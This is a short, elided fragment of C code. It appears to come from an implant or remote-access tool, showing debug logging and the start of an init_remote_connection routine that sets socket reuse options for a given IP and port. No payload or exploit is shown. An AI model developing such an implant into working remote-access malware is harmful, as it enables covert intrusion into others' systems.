...
#ifdef DEBUG
  DEBUG_LOG("buffer: %s [%ld / %ld]", tmp_buffer, nb_chars_in_buffer,
            max_nb_chars);
...
int init_remote_connection(implant_t *instance) {
...
#ifdef DEBUG
  DEBUG_LOG("Initiating remote connection with (%s:%d)", instance->ip,
            instance->port);
#endif
  ...
  */
  ...
  if (setsockopt(sockfd, SOL_SOCKET,
                 SO_REUSEADDR | SO_REUSEPORT, /* allowing to reuse ADDR or PORT
                                                 (useful for testing) */
                 &is_enabled, sizeof(int)) < 0) {
